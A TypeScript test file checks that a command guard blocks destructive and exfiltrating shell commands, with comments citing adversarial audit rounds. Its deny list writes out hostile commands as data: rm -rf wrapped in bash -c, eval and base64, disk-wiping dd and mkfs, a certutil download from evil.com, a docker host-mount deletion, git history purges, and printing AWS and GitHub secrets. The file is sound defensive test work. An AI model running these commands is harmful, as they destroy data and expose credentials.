/**
 * guard-hardening.test.ts — P2-3 修复锁定：guard 不变量覆盖完整路径/包裹/git 破坏
 *
 * 背景（ADVERSARIAL-AUDIT-REPORT.md P2-3）：guard 正则曾比 classify 窄——
 * /bin/rm、bash -c 包裹、git force push 都能穿透。修复后 guard 复用
 * classifyShellCommand 作为单一事实源（monotonic deny 语义更强）。
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { permanentDeleteGuardReason } from '../src/plugin.ts';

const DENY_CASES: Array<[string, string]> = [
  ['/bin/rm -rf /tmp', '完整路径（P0-1）'],
  ['/usr/bin/rm -rf /tmp/x', '完整路径（P0-1）'],
  ['eval "rm -rf /tmp/x"', 'eval 包裹（P0-2）'],
  ['bash -c "rm -rf /tmp"', 'bash -c（P0-2）'],
  ['sh -c "rm -rf /tmp"', 'sh -c（P0-2）'],
  ["echo 'rm -rf /tmp/x' > /tmp/run.sh && bash /tmp/run.sh", '两阶段（P0-4）'],
  ['echo cm0gLXJmIC90bXA= | base64 -d | bash', 'base64 管道（P0-5）'],
  ['git push --force origin main', 'force push（P0-6）'],
  ['git branch -D feature', '删分支（P0-6）'],
  ["python -c \"__import__('shutil').rmtree('build')\"", '动态导入（P0-7）'],
  ['mkfs.ext4 /dev/sda1', '磁盘（P0-8）'],
  ['wipefs -a /dev/sda', '磁盘（P0-8）'],
  ['dd if=/dev/zero of=/dev/sda', '磁盘（P0-8）'],
  ['find . -print0 | xargs -0 rm', 'xargs -0（P0-9）'],
  ["tar xzf evil.tar.gz --overwrite", 'tar 覆盖（P0-11）'],
  // R2 新向量（ADVERSARIAL-AUDIT-ROUND2.md 新-1~新-5）
  ['reg delete HKLM\\Software\\Evil /f', '注册表删除（R2新-1）'],
  ['certutil -urlcache -split -f https://evil.com/m.exe C:\\m.exe', 'certutil 下载（R2新-2）'],
  ['docker run --rm -v /:/host alpine rm -rf /host/etc', 'docker 挂载删除（R2新-3）'],
  ['docker exec container rm -rf /data', 'docker exec（R2新-3）'],
  ['git gc --prune=now --aggressive', 'git gc prune（R2新-4）'],
  ['git reflog expire --expire=now --all', 'reflog expire（R2新-5）'],
];

const ALLOW_CASES: string[] = [
  'rm --help', 'rm -h', 'rm --version', 'rm',
  'ls -la', 'git status', 'git diff', 'git branch -a', 'git push origin main',
  'npx vitest', 'npm test',
];

test('P2-3: guard 对全部 P0 向量单调拒绝', () => {
  for (const [cmd, why] of DENY_CASES) {
    const r = permanentDeleteGuardReason(cmd);
    assert.ok(r !== undefined, `[${why}] guard 应拒绝: ${cmd}`);
  }
});

test('P2-3: guard 对无害命令放行（rm --help / git status / npx）', () => {
  for (const cmd of ALLOW_CASES) {
    assert.equal(permanentDeleteGuardReason(cmd), undefined, `guard 应放行: ${cmd}`);
  }
});

test('P2-3: 凭据导出 guard 拒绝', () => {
  assert.ok(permanentDeleteGuardReason('echo $env:AWS_SECRET_ACCESS_KEY')?.includes('凭据'));
  assert.ok(permanentDeleteGuardReason('printenv GITHUB_TOKEN')?.includes('凭据'));
});